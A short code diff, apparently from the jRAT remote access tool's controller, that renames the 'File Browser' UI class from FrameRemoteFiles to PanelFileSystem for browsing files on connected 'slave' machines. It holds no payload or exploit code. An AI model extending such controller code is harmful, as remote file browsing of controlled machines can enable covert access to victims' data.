@@ -11,7 +11,7 @@ import jrat.controller.AbstractSlave;
 import jrat.controller.Slave;
 import jrat.controller.packets.incoming.IncomingPackets;
 import jrat.module.fs.packets.*;
-import jrat.module.fs.ui.FrameRemoteFiles;
+import jrat.module.fs.ui.PanelFileSystem;
 
 public class FileSystemControllerModule extends Module {
 
@@ -27,13 +27,13 @@ public class FileSystemControllerModule extends Module {
         ClientMenuItem item = new ClientMenuItem("File Browser", Resources.getIcon("folder-tree"), new ClientEventListener() {
             @Override
             public void emit(AbstractSlave slave) {
-                new FrameRemoteFiles((Slave) slave).displayFrame();
+                new PanelFileSystem((Slave) slave).displayFrame();
             }
         });
 
         ClientMenu.addItem(ClientMenu.Category.QUICK_OPEN, item);
 
-        ControlPanelTab action = new ControlPanelTab(ControlPanel.Category.SYSTEM, "File Browser", Resources.getIcon("folder-tree"), FrameRemoteFiles.class);
+        ControlPanelTab action = new ControlPanelTab(ControlPanel.Category.SYSTEM, "File Browser", Resources.getIcon("folder-tree"), PanelFileSystem.class);
 
         ControlPanel.ITEMS.add(action);
     }
